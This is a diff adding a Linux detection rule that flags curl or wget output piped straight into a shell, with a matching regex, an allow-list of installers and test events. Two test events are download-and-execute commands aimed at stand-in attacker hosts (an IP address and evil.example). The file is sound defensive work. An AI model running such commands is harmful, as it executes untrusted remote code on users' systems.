@@ -1,0 +1,37 @@
+id: DF-LNX-007
+title: Remote script piped directly into a shell
+status: stable
+description: >
+  A command downloads content with curl or wget and pipes it straight into a shell
+  interpreter, executing remote code without it ever touching disk.
+author: detectforge
+severity: high
+tags: [attack.execution, attack.command_and_control, attack.t1059.004, attack.t1105]
+logsource: {category: process_creation, product: linux}
+detection:
+  download_and_execute:
+    process.command_line|re: '\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba|z|da)?sh\b'
+  trusted_installers:
+    process.command_line|contains:
+      - https://get.docker.com
+      - https://sh.rustup.rs
+  condition: download_and_execute and not trusted_installers
+falsepositives:
+  - Vendor install one-liners; add them to trusted_installers after review
+tests:
+  - name: curl piped to bash fires
+    expect: 1
+    events:
+      - {"@timestamp": "2026-10-12T10:20:00Z", process: {command_line: "bash -c curl -fsSL http://198.51.100.77/i.sh | bash"}}
+  - name: wget piped to sudo sh fires
+    expect: 1
+    events:
+      - {"@timestamp": "2026-10-12T10:20:00Z", process: {command_line: "wget -qO- http://evil.example/x | sudo sh"}}
+  - name: allow-listed installer does not fire
+    expect: 0
+    events:
+      - {"@timestamp": "2026-10-12T10:20:00Z", process: {command_line: "curl -fsSL https://get.docker.com | sh"}}
+  - name: curl to file does not fire
+    expect: 0
+    events:
+      - {"@timestamp": "2026-10-12T10:20:00Z", process: {command_line: "curl -o /tmp/report.csv https://intranet/report"}}
